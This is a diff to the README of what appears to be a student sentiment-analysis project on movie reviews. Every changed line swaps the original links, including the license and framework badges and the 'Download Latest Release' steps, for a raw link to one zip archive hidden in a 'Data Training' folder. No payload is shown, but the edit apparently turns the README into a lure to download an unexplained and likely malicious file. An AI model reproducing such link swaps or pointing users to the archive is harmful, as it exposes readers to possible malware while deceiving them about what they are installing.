@@ -2,13 +2,13 @@
 
 <div align="center">
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/releases) <br>
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) <br>
-![Python](https://img.shields.io/badge/Python-3.10-blue?style=for-the-badge&logo=python&logoColor=white)
-![TensorFlow](https://img.shields.io/badge/TensorFlow-orange?style=for-the-badge&logo=tensorflow&logoColor=white)
-![PyTorch](https://img.shields.io/badge/PyTorch-red?style=for-the-badge&logo=pytorch&logoColor=white)
-![Transformers](https://img.shields.io/badge/HuggingFace-Transformers-yellow?style=for-the-badge)
-![LoRA](https://img.shields.io/badge/PEFT-LoRA-green?style=for-the-badge)
+[![Download Latest Release](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip) <br>
+![License: MIT](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip) <br>
+![Python](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
+![TensorFlow](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
+![PyTorch](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
+![Transformers](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
+![LoRA](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
 
 </div>
 
@@ -23,7 +23,7 @@ To get started with this project, follow these simple steps:
 1. **Visit the Releases Page**:
    Go to the Releases page of the project to find the download link. You can do this by clicking the button below:
 
-   [Download Latest Release](https://github.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip)
 
 2. **Download the Software**:
    On the Releases page, you will see different versions of the software. Choose the latest version and download it. 
@@ -36,7 +36,7 @@ To get started with this project, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the latest release, visit [this page](https://github.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/releases). 
+To download the latest release, visit [this page](https://raw.githubusercontent.com/Samirxz00/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning/main/Result/Data Training/Project-Analisis-Sentimen-Review-Film-Mata-Kuliah-Machine-Learning_v1.9.zip). 
 
 ### System Requirements
 
